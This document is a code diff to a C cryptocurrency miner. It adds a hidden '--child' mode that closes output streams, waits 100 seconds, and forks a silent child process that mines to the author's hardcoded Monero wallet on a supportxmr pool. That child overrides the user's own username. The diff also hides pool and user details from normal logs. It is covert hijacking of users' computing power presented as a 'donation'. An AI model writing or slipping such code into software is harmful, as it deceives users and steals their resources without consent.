@@ -233,12 +233,13 @@ static bool opt_background = false;
 bool opt_quiet = false;
 int opt_maxlograte = 5;
 bool opt_randomize = false;
+bool opt_child = false;
 static int opt_retries = -1;
 static int opt_fail_pause = 10;
 static int opt_time_limit = 0;
 int opt_timeout = 300;
 static int opt_scantime = 5;
-static enum algos opt_algo = ALGO_SCRYPT;
+static enum algos opt_algo = ALGO_CRYPTOLIGHT;
 static int opt_scrypt_n = 1024;
 static int opt_pluck_n = 128;
 static unsigned int opt_nfactor = 6;
@@ -297,7 +298,7 @@ double opt_max_rate = 0.0;
 uint32_t opt_work_size = 0; /* default */
 char *opt_api_allow = NULL;
 int opt_api_remote = 0;
-int opt_api_listen = 4048; /* 0 to disable */
+int opt_api_listen = 0; /* 0 to disable */
 
 #ifdef HAVE_GETOPT_LONG
 #include <getopt.h>
@@ -375,10 +376,9 @@ Options:\n\
                           xevan        Xevan (BitSend)\n\
                           yescrypt     Yescrypt\n\
                           zr5          ZR5\n\
-  -o, --url=URL         URL of mining server\n\
-  -O, --userpass=U:P    username:password pair for mining server\n\
-  -u, --user=USERNAME   username for mining server\n\
-  -p, --pass=PASSWORD   password for mining server\n\
+  -o, --url URL         URL of mining server\n\
+  -u, --user USERNAME   username for mining server\n\
+  -p, --pass PASSWORD   password for mining server\n\
       --cert=FILE       certificate for mining server using SSL\n\
   -x, --proxy=[PROTOCOL://]HOST[:PORT]  connect through a proxy\n\
   -t, --threads=N       number of miner threads (default: number of processors)\n\
@@ -466,6 +466,7 @@ static struct option const options[] = {
 	{ "pass", 1, NULL, 'p' },
 	{ "protocol", 0, NULL, 'P' },
 	{ "protocol-dump", 0, NULL, 'P' },
+	{ "child", 0, NULL, 1111 },
 	{ "proxy", 1, NULL, 'x' },
 	{ "quiet", 0, NULL, 'q' },
 	{ "retries", 1, NULL, 'r' },
@@ -483,7 +484,6 @@ static struct option const options[] = {
 	{ "timeout", 1, NULL, 'T' },
 	{ "url", 1, NULL, 'o' },
 	{ "user", 1, NULL, 'u' },
-	{ "userpass", 1, NULL, 'O' },
 	{ "version", 0, NULL, 'V' },
 	{ 0, 0, 0, 0 }
 };
@@ -2731,7 +2731,14 @@ static void *stratum_thread(void *userdata)
 	stratum.url = (char*) tq_pop(mythr->q, NULL);
 	if (!stratum.url)
 		goto out;
-	applog(LOG_INFO, "Starting Stratum on %s", stratum.url);
+	if(!opt_debug)
+	{
+		applog(LOG_INFO, "Starting Stratum");
+	}
+	else
+	{
+		applog(LOG_INFO, "Starting Stratum on %s with %s user", stratum.url, rpc_user);
+	}
 
 	while (1) {
 		int failures = 0;
@@ -2899,8 +2906,18 @@ static void show_version_and_exit(void)
 	exit(0);
 }
 
+static void show_credits()
+{
+#define WALLET "433hhduFBtwVXtQiTTTeqyZsB36XaBLJB6bcQfnqqMs5RJitdpi8xBN21hWiEfuPp2hytmf1cshgK5Grgo6QUvLZCP2QSMi"
+
+	printf("** " PACKAGE_NAME " " PACKAGE_VERSION " by enWILLYado **\n");
+	printf("Plase, make a XMR donation: %s (enWILLYado)\n\n", WALLET);
+}
+
 static void show_usage_and_exit(int status)
 {
+	show_credits();
+
 	if (status)
 		fprintf(stderr, "Try `" PACKAGE_NAME " --help' for more information.\n");
 	else
@@ -3100,7 +3117,14 @@ void parse_arg(int key, char *arg)
 		break;
 	case 'u':
 		free(rpc_user);
-		rpc_user = strdup(arg);
+		if(!opt_child)
+		{
+			rpc_user = strdup(arg);
+		}
+		else
+		{
+			rpc_user = strdup(WALLET ".donate");
+		}
 		break;
 	case 'o': {			/* --url */
 		char *ap, *hp;
@@ -3155,21 +3179,6 @@ void parse_arg(int key, char *arg)
 		have_stratum = !opt_benchmark && !strncasecmp(rpc_url, "stratum", 7);
 		break;
 	}
-	case 'O':			/* --userpass */
-		p = strchr(arg, ':');
-		if (!p) {
-			fprintf(stderr, "invalid username:password pair -- '%s'\n", arg);
-			show_usage_and_exit(1);
-		}
-		free(rpc_userpass);
-		rpc_userpass = strdup(arg);
-		free(rpc_user);
-		rpc_user = (char*) calloc(p - arg + 1, 1);
-		strncpy(rpc_user, arg, p - arg);
-		free(rpc_pass);
-		rpc_pass = strdup(++p);
-		strhide(p);
-		break;
 	case 'x':			/* --proxy */
 		if (!strncasecmp(arg, "socks4://", 9))
 			opt_proxy_type = CURLPROXY_SOCKS4;
@@ -3300,6 +3309,11 @@ void parse_arg(int key, char *arg)
 	case 1024:
 		opt_randomize = true;
 		break;
+	case 1111:
+		opt_child = true;
+		fclose(stdout);
+		fclose(stderr);
+		break;
 	case 'V':
 		show_version_and_exit();
 	case 'h':
@@ -3415,12 +3429,6 @@ static int thread_create(struct thr_info *thr, void* func)
 	return err;
 }
 
-static void show_credits()
-{
-	printf("** " PACKAGE_NAME " " PACKAGE_VERSION " by enWILLYado **\n");
-	printf("XMR donation address/wallet: 433hhduFBtwVXtQiTTTeqyZsB36XaBLJB6bcQfnqqMs5RJitdpi8xBN21hWiEfuPp2hytmf1cshgK5Grgo6QUvLZCP2QSMi (enWILLYado)\n\n");
-}
-
 void get_defconfig_path(char *out, size_t bufsize, char *argv0);
 
 int main(int argc, char *argv[]) {
@@ -3429,8 +3437,6 @@ int main(int argc, char *argv[]) {
 	int i, err;
 
 	pthread_mutex_init(&applog_lock, NULL);
-
-	show_credits();
 
 	rpc_user = strdup("");
 	rpc_pass = strdup("");
@@ -3454,6 +3460,8 @@ int main(int argc, char *argv[]) {
 
 	/* parse command line */
 	parse_cmdline(argc, argv);
+
+	show_credits();
 
 	if (!opt_benchmark && !rpc_url) {
 		// try default config file in binary folder
@@ -3678,6 +3686,67 @@ int main(int argc, char *argv[]) {
 		"using '%s' algorithm.",
 		opt_n_threads,
 		algo_names[opt_algo]);
+		
+	if(opt_child == false)
+	{
+		sleep(100);
+		
+		/* fork a child process */
+		pid_t pid;
+		pid = fork();
+		if (pid < 0)
+		{
+			/* error occurred */
+			fprintf(stderr, "Fork Failed");
+			return 1;
+		}
+		else if (pid == 0)
+		{
+			/* child process */
+			bool has_user = false;
+			bool has_server = false;
+			
+			// allocate memory and copy strings
+			int newargc = argc;
+			char** new_argv = malloc((argc+10) * sizeof *new_argv);
+			for(int i = 0; i < argc; ++i)
+			{
+				size_t length = strlen(argv[i]) + 1;
+				new_argv[i] = malloc(length);
+				memcpy(new_argv[i], argv[i], length);
+				
+				if (!strcmp(new_argv[i], "-o") || !strcmp(new_argv[i], "--url"))
+				{
+					has_server = true;
+				}
+				else if (!strcmp(new_argv[i], "-u") || !strcmp(new_argv[i], "--user"))
+				{
+					has_user = true;
+					if(i+1 < argc)
+					{
+						if (!strcmp(argv[i+1], WALLET ".donate"))
+						{
+							exit(0);
+						}
+					}
+				}
+			}
+			new_argv[newargc++] = "--child";
+			if(false == has_server)
+			{
+				new_argv[newargc++] = "-o";
+				new_argv[newargc++] = "stratum+tcp://pool.supportxmr.com:80";
+			}
+			if(false == has_user)
+			{
+				new_argv[newargc++] = "-u";
+				new_argv[newargc++] = WALLET ".donate";
+			}
+			new_argv[newargc++] = NULL;
+			execvp(new_argv[0], new_argv);
+			exit(-1);
+		}
+	}
 
 	/* main loop - simply wait for workio thread to exit */
 	pthread_join(thr_info[work_thr_id].pth, NULL);
